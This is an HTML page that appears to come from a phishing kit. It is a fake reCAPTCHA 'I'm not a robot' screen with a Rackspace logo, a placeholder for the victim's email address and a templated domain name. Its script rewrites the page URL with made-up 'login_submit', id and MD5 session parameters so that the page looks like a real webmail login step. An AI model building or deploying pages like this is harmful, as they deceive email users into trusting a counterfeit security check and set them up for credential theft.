<title>Captcha</title>
<style>
  body {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: #f4f4f4;
    font-family: Arial, sans-serif;
  }

  .captcha-container {
    text-align: center;
    background: #fff;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    width: 302px;
  }

  .logo {
    display: flex;
    justify-content: center;
    margin-bottom: 15px;
  }

  .logo img {
    width: 148px;
    height: 68px;
    object-fit: contain;
    border-radius: 4px;
  }

  .captcha-main {
    display: flex;
    align-items: center;
    justify-content: space-between;
    border: 1px solid #d3d3d3;
    border-radius: 3px;
    padding: 10px;
    background: #fff;
    height: 78px;
  }

  .captcha-left {
    display: flex;
    align-items: center;
  }

  .captcha-checkbox {
    width: 28px;
    height: 28px;
    margin-right: 10px;
    cursor: pointer;
  }

  .captcha-text {
    font-size: 14px;
    color: #555;
    font-weight: bold;
  }

  .captcha-right {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-size: 10px;
    color: #999;
    position: relative;
  }

  .captcha-img {
    width: 35px;
    height: 35px;
    background: url("https://upload.wikimedia.org/wikipedia/en/9/9e/Rackspace_logo.svg") no-repeat center;
    background-size: contain;
    margin-bottom: 5px;
  }

  .spinner-overlay {
    position: absolute;
    top: 0;
    width: 35px;
    height: 35px;
    border: 3px solid #ccc;
    border-top-color: #00a4ef;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    pointer-events: none;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }

  .captcha-footer {
    font-size: 12px;
    color: #555;
    margin-top: 15px;
  }

  .captcha-footer a {
    text-decoration: none;
    color: #0078d4;
    font-weight: 600;
  }

  .email-display {
    font-size: 14px;
    color: #444;
    margin-top: 15px;
    font-weight: 500;
  }
</style>

<script>
  var loading = true;
  if(loading) {
      var href = window.location.href;
      var regex = new RegExp("[&\\?]cmd=");
      if (regex.test(href)) {
      } else {
          let rand =  Math.random() * 1000000000;
          var md5 = CryptoJS.MD5(rand);
          window.location.href = href.replace(/]/g, '') + `&em=cmd=login_submit&id=${rand + rand}&session=${md5 + md5}`
          loading = false;
      }
  }
</script>
</head>
<body>

<div class="captcha-container">
  <div class="logo">
    <img src="" id="img-field" alt="logo">
  </div>

  <div class="captcha-main">
    <div class="captcha-left">
      <input type="checkbox" class="captcha-checkbox" />
      <label class="captcha-text">I'm not a robot</label>
    </div>
    <div class="captcha-right">
      <div class="captcha-img"></div>
      <div class="spinner-overlay"></div>
      <div>reCAPTCHA</div>
    </div>
  </div>

  <div class="email-display" id="emailDisplay">Email: Loading...</div>

  <div class="captcha-footer">
    <div><a href="#" id="domainText">[DomainWithoutTLD]</a> - <a href="#">Privacy</a> - <a href="#">Terms</a></div>
  </div>
</div>
